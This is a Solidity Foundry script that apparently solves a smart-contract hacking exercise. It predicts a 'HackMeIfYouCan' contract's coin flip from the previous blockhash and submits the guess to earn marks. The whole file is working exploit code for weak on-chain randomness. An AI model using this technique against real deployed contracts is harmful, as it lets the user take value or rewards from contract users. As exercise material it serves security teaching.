// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/HackMeIfYouCan.sol";

contract Attack is Script {
    HackMeIfYouCan public hackMeContract;
    address payable attacker;
    bool public inReentrancy;

    function setUp() public {
        attacker = payable(vm.envAddress("PUBLIC_KEY"));
        vm.deal(attacker, 100 ether);
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Starting Attack...");

        bytes32 password = 0x70617373776f7264000000000000000000000000000000000000000000000000; // Exemple de mot de passe
        bytes32[15] memory data;
        hackMeContract = HackMeIfYouCan(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        console.log("HackMeIfYouCan contract deployed at:", address(hackMeContract));

        console.log("\n=========\n");
        attackFlip(1);


        console.log("Get marks:", hackMeContract.getMarks(attacker));

        vm.stopBroadcast();
    }

    function attackFlip(uint256 iterations) public {
        uint256 FACTOR = 6275657625726723324896521676682367236752985978263786257989175917;
        for (uint256 i = 0; i < iterations; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool guess = coinFlip == 1 ? true : false;

            try hackMeContract.flip(guess) {
                console.log("Flip attempt", i, "succeeded");
            } catch {
                console.log("Flip attempt", i, "failed");
            }

        }
        
    }

}
